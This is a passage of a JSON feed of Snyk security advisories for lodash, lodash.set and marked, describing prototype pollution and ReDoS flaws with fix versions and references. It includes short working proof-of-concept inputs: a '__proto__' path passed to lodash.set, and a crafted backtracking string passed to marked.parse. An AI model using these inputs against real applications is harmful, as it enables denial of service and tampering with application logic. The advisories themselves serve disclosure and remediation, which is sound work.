Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.17 or higher.\n## References\n- [GitHub Gist](https://gist.github.com/Sampaguitas/a316bced4fdd501146b07997d1d04eb2)\n- [Vulnerable Code](https://github.com/lodash/lodash/blob/aaa111912cb05e6f0f9f23d1eb8a41ccfcf9c2c2/lodash.zipobjectdeep/index.js#L738)\n",
        "created_at": "2023-12-24T16:03:36Z",
        "updated_at": "2024-04-22T04:02:54Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.17 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.17"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.17.17"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2023-12-23T22:00:00Z",
            "exploit": "Proof of Concept",
            "publication_time": "2024-04-15T13:48:35Z",
            "references": [
              {
                "url": "https://gist.github.com/Sampaguitas/a316bced4fdd501146b07997d1d04eb2",
                "title": "GitHub Gist"
              },
              {
                "url": "https://github.com/lodash/lodash/blob/aaa111912cb05e6f0f9f23d1eb8a41ccfcf9c2c2/lodash.zipobjectdeep/index.js%23L738",
                "title": "Vulnerable Code"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASH-73638",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The functions `merge`, `mergeWith`, and `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype`. This is due to an incomplete fix to `CVE-2018-3721`.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.11 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4337)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1066)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1068)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1071)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/782)\n- [POC: HackerOne Report](https://hackerone.com/reports/380873)\n",
        "created_at": "2019-02-03T09:06:37Z",
        "updated_at": "2024-07-09T12:48:35Z",
        "problems": [
          {
            "id": "CVE-2018-16487",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.11 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.11"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.17.11"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2018-08-31T18:21:00Z",
            "exploit": "Proof of Concept",
            "publication_time": "2019-02-01T18:21:00Z",
            "references": [
              {
                "url": "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/lodash/lodash/pull/4337",
                "title": "GitHub PR"
              },
              {
                "url": "https://www.npmjs.com/advisories/1066",
                "title": "NPM Security Advisory"
              },
              {
                "url": "https://www.npmjs.com/advisories/1068",
                "title": "NPM Security Advisory"
              },
              {
                "url": "https://www.npmjs.com/advisories/1071",
                "title": "NPM Security Advisory"
              },
              {
                "url": "https://www.npmjs.com/advisories/782",
                "title": "NPM Security Advisory"
              },
              {
                "url": "https://hackerone.com/reports/380873",
                "title": "POC: HackerOne Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASH-73639",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It parses dates using regex strings, which may cause a slowdown of 2 seconds per 50k characters.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `lodash` to version 4.17.11 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/5c08f18d365b64063bfbfa686cbb97cdd6267347)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4450)\n- [POC: GitHub Issue](https://github.com/lodash/lodash/issues/3359)\n",
        "created_at": "2019-02-03T09:18:05Z",
        "updated_at": "2024-06-19T12:38:24Z",
        "problems": [
          {
            "id": "CVE-2019-1010266",
            "source": "CVE"
          },
          {
            "id": "CWE-185",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.11 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.11"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.17.11"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 4.4,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2017-09-05T09:14:29Z",
            "exploit": "Proof of Concept",
            "publication_time": "2019-04-05T09:14:22Z",
            "references": [
              {
                "url": "https://github.com/lodash/lodash/commit/5c08f18d365b64063bfbfa686cbb97cdd6267347",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/lodash/lodash/pull/4450",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/lodash/lodash/issues/3359",
                "title": "POC: GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASHSET-1320032",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[lodash.set](https://www.npmjs.com/package/lodash.set) is a lodash method _.set exported as a Node.js module.\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `set` and `setwith` functions due to improper user input sanitization.\n\n**Note**\r\n\r\n`lodash.set` is not maintained for a long time. It is recommended to use `lodash` library, which contains the fix since version 4.17.17.\n\n## PoC\n```js\r\nlod = require('lodash')\r\nlod.set({}, \"__proto__[test2]\", \"456\")\r\nconsole.log(Object.prototype)\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nThere is no fixed version for `lodash.set`.\n\n## References\n- [HackerOne Report](https://hackerone.com/reports/864701)\n",
        "created_at": "2021-07-19T12:00:32Z",
        "updated_at": "2024-04-15T16:31:58Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": null,
            "representation": [
              {
                "resource_path": "*"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-08-21T10:34:29Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-08-21T12:53:03Z",
            "references": [
              {
                "url": "https://hackerone.com/reports/864701",
                "title": "HackerOne Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MARKED-174116",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The `inline.text regex` may take quadratic time to scan for potential email addresses starting at every point.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 0.6.2 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/00f1f7a23916ef27186d0904635aa3509af63d47)\n- [GitHub Commit](https://github.com/markedjs/marked/pull/1460/commits/be27472a8169dda7875330939f8115ab677cdc07)\n- [GitHub PR](https://github.com/markedjs/marked/pull/1460)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/812)\n",
        "created_at": "2019-04-07T06:53:01Z",
        "updated_at": "2024-03-06T13:55:38Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.6.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.6.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=0.1.3 <0.6.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2019-04-04T20:27:50Z",
            "exploit": "Not Defined",
            "publication_time": "2019-04-07T06:53:47Z",
            "references": [
              {
                "url": "https://github.com/markedjs/marked/commit/00f1f7a23916ef27186d0904635aa3509af63d47",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/markedjs/marked/pull/1460/commits/be27472a8169dda7875330939f8115ab677cdc07",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/markedjs/marked/pull/1460",
                "title": "GitHub PR"
              },
              {
                "url": "https://www.npmjs.com/advisories/812",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MARKED-2342073",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when passing unsanitized user input to `inline.reflinkSearch`, if it is not being parsed by a time-limited worker thread.\r\n\r\n## PoC\r\n```js\r\nimport * as marked from 'marked';\r\n\r\nconsole.log(marked.parse(`[x]: x\r\n\r\n\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](\\\\[\\\\](`));\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 4.0.10 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/c4a3ccd344b6929afa8a1d50ac54a721e57012c0)\n",
        "created_at": "2022-01-16T09:07:08Z",
        "updated_at": "2024-03-11T09:53:51Z",
        "problems": [
          {
